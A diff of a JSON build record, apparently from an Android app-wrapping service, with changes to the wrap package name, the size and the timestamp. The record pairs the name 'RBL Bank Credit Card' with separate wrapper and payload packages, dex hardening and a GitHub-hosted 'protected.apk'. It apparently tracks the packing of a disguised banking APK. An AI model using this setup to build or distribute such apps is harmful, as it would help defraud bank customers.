@@ -2,11 +2,11 @@
   "user_id": 7771105502,
   "slot": 2,
   "app_name": "RBL Bank Credit Card",
-  "wrap_package": "hv8.w7p4bj.cjzx.fogbx",
+  "wrap_package": "syz.dtmqwk.bohy.klf2o",
   "payload_package": "ps2.vak3nc.c7ua.zmdhq",
   "wrap_bin": "ps2.vak3nc.c7ua.zmdhq.bin",
   "protect_method": "hard_dex",
   "cdn_url": "https://raw.githubusercontent.com/mohanqquiku/Private-Database/main/users/7771105502/app2/output/protected.apk",
-  "size": 3052258,
-  "updated_at": "2026-11-28T14:08:49.403Z"
+  "size": 3055827,
+  "updated_at": "2026-11-28T14:14:37.333Z"
 }
